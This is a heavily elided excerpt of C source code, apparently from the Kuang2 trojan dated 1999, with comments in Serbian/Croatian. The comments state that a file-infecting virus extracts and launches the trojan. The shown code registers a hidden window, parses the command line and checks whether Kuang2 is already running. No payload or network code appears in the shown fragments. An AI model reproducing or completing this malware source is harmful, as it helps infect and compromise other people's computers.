...
// ver 0.20 (14-may-1999): razna sređivanja
...
LRESULT CALLBACK MsgLoop(HWND hwnd, unsigned msg, WPARAM wParam, LPARAM lParam)
{
	switch (msg) {
		...
		// jedan od klijenata je završio rad
		case UM_QUITCLIENT:
...
BOOL InitApp(HINSTANCE hInst)
{
	...
	// parametri klase
	wc.cbSize		 = sizeof(WNDCLASSEX);		// veličina strukture
	...
	if (!RegisterClassEx(&wc)) {
		if (!RegisterClass((LPWNDCLASS)&wc.style))		// možda je NT u pitanju
	...
	if (!hwnd) return FALSE;	// greška?

	ShowWindow(hwnd, SW_HIDE);	// sakrij prozor
	return TRUE;				// sve je prošlo ok.
}
...
/*
	WinMain
	--------
  + Virus koji je zakačen na fajlove ekstrakuje i startuje ovog trojanca. */
...
int Wmain()
{
	...
	i=0;
	if (CmdLine[0]=='"') {                          // u najvećem broju slučajeva
	...
	// ako je Kuang2 već aktivan izađi
